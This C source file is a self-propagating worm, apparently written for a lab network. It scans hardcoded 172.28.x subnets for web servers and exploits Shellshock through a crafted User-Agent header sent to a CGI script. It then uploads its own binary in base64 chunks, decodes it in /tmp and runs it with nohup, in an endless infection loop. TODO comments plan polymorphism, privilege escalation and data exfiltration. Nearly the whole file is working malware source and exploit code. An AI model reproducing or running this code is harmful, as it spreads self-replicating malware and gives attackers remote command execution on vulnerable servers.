#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdint.h>

// Configuration - must be changed to a real scan
#define MAX_SUBNETS 4
#define MAX_IP_LEN 16
#define MAX_PATH_LEN 256
#define CHUNK_SIZE 4000
#define TARGET_SCRIPT "/cgi-bin/status.cgi"
#define REMOTE_WORM_PATH "/tmp/worm"
#define REMOTE_B64_PATH "/tmp/worm.b64"
#define SCAN_TIMEOUT 2
#define HTTP_TIMEOUT 5

// Subnets to scan
const char* SUBNETS[MAX_SUBNETS] = {
    "172.28.1",
    "172.28.2",
    "172.28.3",
    "172.28.4"
};

// Base64 encoding table
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode function
 * Returns dynamically allocated string (caller must free)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Get the path to the current executable
 * Returns dynamically allocated string (caller must free)
 */
char* get_executable_path(const char* argv0) {
    char* path = malloc(PATH_MAX);
    if (!path) return NULL;
    
    // Try /proc/self/exe first (Linux)
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len != -1) {
        path[len] = '\0';
        return path;
    }
    
    // Fallback: use argv[0] if available
    if (argv0) {
        // If it's an absolute path, use it directly
        if (argv0[0] == '/') {
            return strdup(argv0);
        }
        // Otherwise, try to resolve it (simplified - just return as-is)
        return strdup(argv0);
    }
    
    free(path);
    return NULL;
}

/**
 * Scan target IP for port 80
 * Returns 1 if port is open, 0 otherwise
 */
int scan_target(const char* ip) {
    printf("[*] Scanning %s for port 80...\n", ip);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("[-] Error creating socket: %s\n", strerror(errno));
        return 0;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("[-] Error converting IP address\n");
        close(sock);
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = SCAN_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Execute a command on target via Shellshock
 * Returns dynamically allocated response string (caller must free), or NULL on error
 */
char* run_exploit(const char* ip, const char* command) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return NULL;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = HTTP_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return NULL;
    }
    
    // Build Shellshock payload
    char payload[2048];
    snprintf(payload, sizeof(payload), "() { :; }; /bin/bash -c '%s'", command);
    
    // Build HTTP request
    char request[4096];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:80\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        TARGET_SCRIPT, ip, payload);
    
    // Send request
    if (send(sock, request, strlen(request), 0) < 0) {
        close(sock);
        return NULL;
    }
    
    // Read response
    char* response = malloc(65536);
    if (!response) {
        close(sock);
        return NULL;
    }
    
    ssize_t total = 0;
    ssize_t n;
    while ((n = recv(sock, response + total, 65536 - total - 1, 0)) > 0) {
        total += n;
        if (total >= 65535) break;
    }
    response[total] = '\0';
    
    close(sock);
    
    // Extract body (skip headers)
    char* body = strstr(response, "\r\n\r\n");
    if (body) {
        body += 4;
        char* body_copy = strdup(body);
        free(response);
        return body_copy;
    }
    
    return response;
}

/**
 * Infect target by uploading and executing this worm
 * Returns 1 on success, 0 on failure
 */
int infect_target(const char* ip, const char* argv0) {
    if (!scan_target(ip)) {
        return 0;
    }
    
    printf("[+] Web Server found at %s!\n", ip);
    printf("[*] Attempting infection on %s via Shellshock...\n", ip);
    
    // 1. Read own binary -> Self-replication
    char* exe_path = get_executable_path(argv0);
    if (!exe_path) {
        // Fallback: try /proc/self/exe
        printf("[-] Could not determine executable path, trying /proc/self/exe\n");
        exe_path = strdup("/proc/self/exe");
    }
    
    FILE* f = fopen(exe_path, "rb");
    if (!f) {
        printf("[-] Error reading own binary: %s\n", strerror(errno));
        free(exe_path);
        return 0;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size_long = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size_long < 0) {
        printf("[-] Error getting file size\n");
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t file_size = (size_t)file_size_long;
    
    // Read file
    unsigned char* worm_content = malloc(file_size);
    if (!worm_content) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t bytes_read = fread(worm_content, 1, file_size, f);
    fclose(f);
    free(exe_path);
    
    if (bytes_read != file_size) {
        printf("[-] Error reading binary: incomplete read\n");
        free(worm_content);
        return 0;
    }
    
    // TODO: function polimorfism(): add random bytes to make the worm code change 
    // without changing the functionality. And maybe can add more lab techniques 
    // to make it more complex
    // worm_content = polimorfism(worm_content) -> to be done
    
    // Base64 encode
    size_t b64_len;
    char* b64_content = base64_encode(worm_content, file_size, &b64_len);
    free(worm_content);
    
    if (!b64_content) {
        printf("[-] Error encoding binary\n");
        return 0;
    }
    
    // 2. Check if already infected (simple check)
    // We try to ls the worm file. If it exists, we skip.
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), 
        "echo 'Content-type: text/plain'; echo; /bin/ls %s", REMOTE_WORM_PATH);
    
    char* check = run_exploit(ip, check_cmd);
    if (check && strstr(check, REMOTE_WORM_PATH)) {
        printf("[*] Target %s already infected.\n", ip);
        free(check);
        free(b64_content);
        return 1;
    }
    if (check) free(check);
    
    // 3. Clean up remote files -> Self-destruction, but if we change the CVE it must be changed
    // char cleanup_cmd[512];
    // snprintf(cleanup_cmd, sizeof(cleanup_cmd), "rm -f %s %s", REMOTE_B64_PATH, REMOTE_WORM_PATH);
    // run_exploit(ip, cleanup_cmd);
    
    // 4. Upload in chunks -> slice the worm code (the header used in the exploit 
    // have a maximum size) and upload it to the infected target
    printf("[*] Uploading worm (%zu bytes)...\n", b64_len);
    
    for (size_t i = 0; i < b64_len; i += CHUNK_SIZE) {
        size_t chunk_len = (i + CHUNK_SIZE < b64_len) ? CHUNK_SIZE : (b64_len - i);
        char* chunk = malloc(chunk_len + 1);
        if (!chunk) continue;
        
        memcpy(chunk, b64_content + i, chunk_len);
        chunk[chunk_len] = '\0';
        
        // Escape special characters for shell command
        // Simple approach: wrap in single quotes and escape single quotes
        char* escaped_chunk = malloc(chunk_len * 2 + 1);
        if (escaped_chunk) {
            size_t j = 0;
            for (size_t k = 0; k < chunk_len; k++) {
                if (chunk[k] == '\'') {
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\\';
                    escaped_chunk[j++] = '\'';
                    escaped_chunk[j++] = '\'';
                } else {
                    escaped_chunk[j++] = chunk[k];
                }
            }
            escaped_chunk[j] = '\0';
            
            char cmd[8192];
            snprintf(cmd, sizeof(cmd), "/bin/echo -n '%s' >> %s", escaped_chunk, REMOTE_B64_PATH);
            run_exploit(ip, cmd);
            
            free(escaped_chunk);
        }
        
        free(chunk);
    }
    
    // 5. Decode -> once the worm is there we decode it to get the original code
    printf("[*] Decoding payload...\n");
    char decode_cmd[512];
    snprintf(decode_cmd, sizeof(decode_cmd), 
        "/usr/bin/base64 -d %s > %s", REMOTE_B64_PATH, REMOTE_WORM_PATH);
    run_exploit(ip, decode_cmd);
    
    // 6. Execute
    printf("[+] Executing worm on %s...\n", ip);
    // We run it in background using nohup
    // We verify the binary exists first, though we assume it does based on checks
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), 
        "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
    run_exploit(ip, exec_cmd);
    
    printf("[+] Infection command sent to %s\n", ip);
    
    free(b64_content);
    return 1;
}

// TODO: function scan_network(): return the list of victims that can be attacked

// TODO: function priviledge_escalation(): try to escalate privileges to root 
// if necessary and not done with the propagation

// TODO: function data_exfiltration(): or the attack we want to finally do

int main(int argc, char* argv[]) {
    (void)argc;  // Suppress unused parameter warning
    printf("=== C Shellshock Worm ===\n");
    
    // Delay to allow system to settle if just started
    sleep(2);
    
    // Execute the attack to this machine, maybe can we decide with an args 
    // if we want to attack this machine or just used to propagate
    // priviledge_escalation();
    // data_exfiltration();
    
    // Infection loop
    while (1) {
        printf("\n[*] Starting infection round...\n");
        
        // SUBNETS = scan_network() -> to be done
        for (int i = 0; i < MAX_SUBNETS; i++) {
            // Try hosts .2 and .3
            for (int host = 2; host < 4; host++) {
                char ip[MAX_IP_LEN];
                snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
                
                // Skip self (simple check, not robust for all network configs but good enough)
                // In a real worm we'd check interfaces.
                infect_target(ip, argv[0]);
            }
        }
        
        printf("[*] Round complete. Sleeping 20 seconds...\n");
        sleep(20);
    }
    
    return 0;
}

